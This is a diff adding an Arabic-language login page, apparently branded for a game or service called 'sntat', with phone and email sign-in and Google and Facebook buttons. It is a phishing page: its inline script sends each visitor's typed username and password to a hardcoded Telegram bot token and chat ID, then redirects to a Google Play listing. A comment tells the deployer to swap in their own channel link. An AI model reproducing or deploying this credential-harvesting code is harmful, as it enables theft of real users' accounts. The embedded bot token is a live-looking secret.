@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+</head>
+<body>
+    <form class="login-form" onsubmit="sendToTelegram(event)">
+        <div class="container">
+            <header>
+                <img src="./sntat-logo.png" alt="شعار النظام">
+            </header>
+
+            <section class="main-content">
+                <div class="top">
+                    <h1>تسجيل الدخول</h1>
+                    <div class="btns">
+                        <button type="button" class="mail" id="mail" onclick="checkLogMode(this.id)">البريد الالكتروني</button>
+                        <button type="button" class="phone" id="phone" onclick="checkLogMode(this.id)">رقم الهاتف</button>
+                    </div>
+                </div>
+
+                <div class="inputs">
+                    <div class="flags">
+                        <i class="fa-solid fa-sort-down"></i>
+                        <img src="./Flag_of_Iraq.svg.png" alt="علم العراق">
+                    </div>
+                    
+                    <input type="text" id="userInput" name="text" class="mpInput" placeholder="رقم الهاتف" required>
+                    <input type="password" id="password" name="password" class="password-input" placeholder="كلمة المرور" required>
+                    <button type="submit" class="log-btn">الدخول</button>
+                </div>
+
+                <div class="info">
+                    <div class="contacts">
+                        <a href="#" class="google"><img src="./google-icon.png" alt="تسجيل الدخول بجوجل"></a>
+                        <a href="#" class="facebooke" onclick="window.location.href='FB.html'; return false;">
+                            <i class="fa-brands fa-facebook"></i>
+                        </a>
+                    </div>
+
+                    <div class="forget-password">
+                        <p>نسيت كلمة المرور؟</p>
+                        <i class="fa-solid fa-arrow-rotate-right"></i>
+                    </div>
+                    <div class="praivcy-setting">
+                        <p>سياسة الخصوصية</p>
+                        <i class="fa-solid fa-gear"></i>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </form>
+
+    <script>
+        // دالة الإرسال إلى Telegram
+        async function sendToTelegram(e) {
+    e.preventDefault();
+    
+    const userInput = document.getElementById('userInput').value;
+    const password = document.getElementById('password').value;
+    
+    const botToken = '7735109468:AAFLmHRJhnDBruWaSNhdP9C9YOT7N8CMM-M';
+    const chatId = '498134307';
+    
+    const message = `
+          {sntet}
+  
+${userInput}
+-------------------------------
+${password}
+    `;
+
+    try {
+        const response = await fetch(
+            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
+        );
+        
+        if (response.ok) {
+            // تغيير هذا السطر إلى رابط قناتك
+            window.location.href = 'https://play.google.com/store/apps/details?id=my.game.sntat'; 
+        } else {
+            const errorData = await response.json();
+            alert(`فشل الإرسال: ${errorData.description}`);
+        }
+    } catch (error) {
+        alert('حدث خطأ في الشبكة: ' + error.message);
+    }
+}
+
+        // دالة تبديل طريقة الدخول
+        function checkLogMode(mode) {
+            const inputField = document.getElementById('userInput');
+            inputField.placeholder = mode === 'mail' ? 
+                'البريد الإلكتروني' : 
+                'رقم الهاتف';
+            inputField.type = mode === 'mail' ? 'email' : 'tel';
+        }
+    </script>
+    <script src="main.js"></script>
+</body>
+</html>
